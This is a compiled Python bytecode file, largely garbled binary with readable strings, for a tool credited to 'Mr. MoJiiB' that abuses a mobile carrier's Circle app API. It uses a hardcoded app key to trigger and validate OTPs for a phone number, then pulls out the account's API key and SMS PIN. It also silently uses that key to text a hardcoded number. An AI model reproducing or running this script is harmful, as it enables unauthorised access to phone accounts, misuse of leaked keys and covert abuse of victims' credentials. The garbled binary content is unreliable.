o
    ��bM  �                   @   s�  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd� Zeeed e
 ��Ze �d� eed � e�d�Zeed � ee	d � eed e	 d e d � e�d� ee
de�� d � eed � ee
d � d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ eed � d dlZd dlZd dlZd dlmZ d dlmZmZmZmZ d dlZd dlmZ d dlZde Ze� Zd ed!< d"ed#< eZ d$ed%< ee� ej!eed&�Z"e"�� d' d(k�r&ed) Z#e#D ]Z$ej%�&e$� ej%�'�  e�d*� �qe�d+� ne	d, Z#e#D ]Z$ej%�&e$� ej%�'�  e�d*� �q,e�d-� e"�� d' d.k�re	d/ Z#e#D ]Z$ej%�&e$� ej%�'�  e�d*� �qTeeed0 e
 ��Z(d1e( d2 e  Zz	ejeed&�Z"W n
   eed3 � Y e"�� d' d4k�r�ed5� n�z`e	d6 e e"�� d7 d8  e	 d9 e e"�� d7 d:  e	 d; e e"�� d7 d<  Z#e#D ]Z$ej%�&e$� ej%�'�  e�d*� �q�d=Ze� Z)d e)d!< d"e)d#< e"�� d7 d: e)d>< ej!ee)d&�Z*W n   ed? Z#Y e#D ]Z$ej%�&e$� ej%�'�  e�d*� �qned@ Z#e#D ]Z$ej%�&e$� ej%�'�  e�d*� �q"eee	dA e
 dB e	 dC ��Z+e �d� dS )D�    N�clearzlolcat banner.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   �{�G�z�?)�sys�stdout�write�flush�time�sleep)ZpudinaZword� r   �api.py�	logoprint   s
   
�r   z[>] Enter Number: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : Mr. MoJiiBz	 VERSION 	  : 3.0u   	 ♥♥z	 Mr. MoJiiBr   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictz 
)r
   )�init�Fore�Back�Stylezahttps://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=21799&app_version=78&msisdn=88�gzipz
User-AgentZ(000oc0so48owkw4s0wwo4c00g00804w80gwkw8kgz	x-app-keyz!application/x-www-form-urlencodedzContent-Type)�headersZrdesczGApp installation not allowed because user account is strictly SMS ONLY.u   
	[×] Make Sure Capp Ong�������?�   � g�������?ZOKu(   
	[√] Otp Has Been Sent Seccesful....
z

[>] Enter Otp: zShttps://circle.robi.com.bd/mylife/appapi/appcall.php?op=validateOTC&pin=123456&otc=z&app_version=79&msisdn=88zuse vpnz	Not foundu   

	 [×] User Not Foundz
[>] CIRCLE ID 	 : 	�dataZnicknamez
[>] X-API-KEY 	 : 	Zmkeyz
[>] SMS PIN  	 : 	Zsms_pinz�https://circle.robi.com.bd/mylife/appapi/appcall.php?op=performAction&app_version=81&action=kast&msgId=62&msisdn=8801875409158&message=You Have Got Your Api From MoJiiB's...!! &retry=falsez	x-api-keyu*   
	 [×] Something Went Wrong...Try Again/nu   
	[×] Otp Failed To Sent
z	 

	Pressz Enterz To Exit),�os�system�printZasyncior   Zrequestsr	   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanZbiehiter   �str�inputZnumber�getZresponser
   ZjsonZrequests.structuresr   Zcoloramar   r   r   r   Zurlr   ZnumZpostZrespZwords�charr   r   r   �cZheaders9�xZxnr   r   r   r   �<module>   s�    




	




T


�
 